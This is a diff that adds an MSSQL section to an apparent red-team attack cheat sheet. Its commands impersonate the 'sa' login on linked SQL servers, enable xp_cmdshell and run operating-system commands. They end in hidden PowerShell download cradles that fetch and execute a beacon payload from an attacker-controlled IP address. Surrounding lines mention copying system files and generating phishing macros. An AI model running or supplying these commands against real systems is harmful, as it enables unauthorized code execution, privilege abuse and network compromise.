@@ -163,6 +163,32 @@ Remote Execute
     * COPY ANY SYSTEM FILE
       C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
       
+MSSQL QUERIES
+* NOTE: SYNTAX FOR QUOTES: 
+	The same way it's possible to nest as many openquery statements as necessary to access all the linked servers. 
+	Every nested query has to use twice as many single quotes as the outer query; writing queries gets quite cumbersome when you have to use 32 single quotes around every string.
+
+QUERY LOCAL SQL VERSION
+	select * from openquery ([m3sqlw.m3c.local],'SELECT @@Version')
+
+QUERY SQL ON LINKED SERVER (IMPERSONATE SA)
+	VERSION 
+	  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select * from openquery ([m3sqlw.m3c.local],'SELECT @@Version')"
+	XP CMD SHELL STATUS (value_in_use : 1 = ENABLED)
+	  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select * from openquery ([m3sqlw.m3c.local], 'select * from sys.configurations where name = ''xp_cmdshell''')"
+
+ENABLE XP CMD SHELL ON LINKED SERVER (IMPERSONATE SA)
+  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT [m3sqlw.m3c.local];"
+
+EXECUTE COMMANDS ON LINKED SERVER (IMPERSONATE SA)
+  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select 1 from openquery ([m3sqlw.m3c.local], 'select 1;EXEC master..xp_cmdshell ''whoami''')"
+  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('master..xp_cmdshell ''whoami''') AT [m3sqlw.m3c.local];"
+
+BEACON LINKED SERVER (IMPERSONATE SA)
+  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; select 1 from openquery ([m3sqlw.m3c.local], 'select 1;EXEC master..xp_cmdshell ''powershell.exe -nop -w hidden -c ''''IEX ((new-object net.webclient).downloadstring(''''''''http://10.10.16.13:80/cyber''''''''))''''''')"
+  powerpick get-sqlquery -verbose -instance cywebdw -query "execute as login = 'sa'; EXECUTE('master..xp_cmdshell ''powershell.exe -nop -w hidden -c ''''IEX ((new-object net.webclient).downloadstring(''''''''http://10.10.16.13:80/cyber''''''''))''''''') AT [m3sqlw.m3c.local];"
+
+
 Phishing Macro XLM 
     Download https://github.com/FortyNorthSecurity/hot-manchego
     Generate CS Macro and save it to Windows as vba.txt
